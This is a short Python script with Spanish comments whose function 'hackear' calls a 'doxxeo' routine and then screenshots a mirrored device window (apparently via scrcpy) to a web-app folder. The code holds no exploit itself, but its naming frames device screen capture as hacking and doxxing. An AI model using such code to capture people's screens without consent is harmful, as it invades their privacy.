from src import ScreenVentana
from src import intento
import time

def hackear(id):
    ventana = intento.doxxeo(id)
    if (ventana):
        time.sleep(3)
        window_title = intento.get_device_model(id) # Especifica el título de la ventana que deseas capturar
        output_file = "webapp/screen.png" # Especifica el nombre del archivo de salida
        ScreenVentana.bring_window_to_front(window_title)  # Traer la ventana al frente
        ScreenVentana.capture_window(window_title, output_file) # Capturar la ventana
        intento.end_srcrpy(ventana)
        
